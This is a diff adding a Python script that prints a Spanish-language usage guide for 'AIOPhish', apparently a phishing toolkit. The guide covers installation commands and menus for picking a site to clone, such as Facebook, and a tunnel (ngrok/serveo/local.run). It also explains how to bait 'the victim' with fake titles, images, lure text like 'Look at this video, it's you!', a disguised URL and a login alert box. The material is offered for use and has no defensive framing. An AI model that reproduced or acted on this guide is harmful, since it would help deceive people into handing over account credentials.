@@ -1,0 +1,92 @@
+import os
+os.system("figlet AIOPhish")
+print("""
+\033[1;39m
+AIOPhish es una de las herramientas de phishing mas completa podiendo agregar idioma, fotos, titulos etc.
+\033[1;33m
+Caracteristicas:
+\033[1;39m
+[*] Cuenta con 40 plantillas [*]
+[*] Cuenta con 3 tunnel a elegir local.run/serveo/ngrok [*]
+[*] Puedes redireccionar a la persona [*]
+[*] Puedes elegir el idioma de la pagina(ingles/español) [*]
+\033[1;36m
+Al momento de enviar el link puedes:
+\033[1;39m
+* Colocar titulos
+* Colocar imagenes
+* Colocar descripciones
+* Colocar url
+\033[1;36m
+Al momento de entrar a la pagina puedes:
+\033[1;39m
+* Colocar un alertbox
+\033[1;32m
+Instalación:
+\033[1;39m
+$ cd
+$ pkg install git -y
+$ pkg install php -y
+$ git clone https://github.com/theb3stt/AIOPhish
+$ cd AIOPhish
+$ bash aiophish.sh
+\033[1;33m
+Uso:
+\033[1;32m
+Menú Principal:
+\033[1;39m
+Selecciona un sitio web, para proceder con el phishing.
+\033[1;36m
+Ejemplo:
+\033[1;39m
+Eligo la opción 6, facebook
+\033[1;32m
+Segundo menú:
+\033[1;39m
+Selecciona el idioma de la pagina (español/ingles) solo en algunas paginas se puede elegir el idioma.
+\033[1;33m
+Tercer menú:
+\033[1;39m 
+Selecciona el tunnel (local.run/serveo/ngrok) ngrok necesita una instalación, serveo/local.run es de uso mas sencillo.
+\033[1;32m
+Cuarto menú:
+\033[1;39m
+show title: mostrara un titulo al enviar el link a la victima.
+\033[1;33m
+Ejemplo:
+\033[1;39m
+Facebook LogIn
+
+show image: mostrara una imagen al enviar el link a la victima.
+\033[1;33m
+Ejemplo:
+\033[1;39m
+/sdcard/Download/foto.png
+
+show description: mostrara una pequeña descripción al enviar el link a la victima
+\033[1;33m
+Ejemplo:
+\033[1;39m
+Mira este video es tuyo!
+
+show url: mostrara un url al enviar el link a la victima. default tu sessión de ngrok.
+\033[1;33m
+Ejemplo:
+\033[1;39m
+facebook.com
+
+show alert box: mostrara un mensaje de alerta al entrar
+	 
+al link.
+\033[1;33m
+Ejemplo:
+\033[1;39m
+Primero debes iniciar sesión
+
+Escoge las opciones deseadas con el numero indicado. Puedes añadir todas las opciones y/o no añadir ninguna.
+
+Escribe run o start para iniciar con ajustes añadidos o sin ajustes
+añadidos.
+
+""")
+
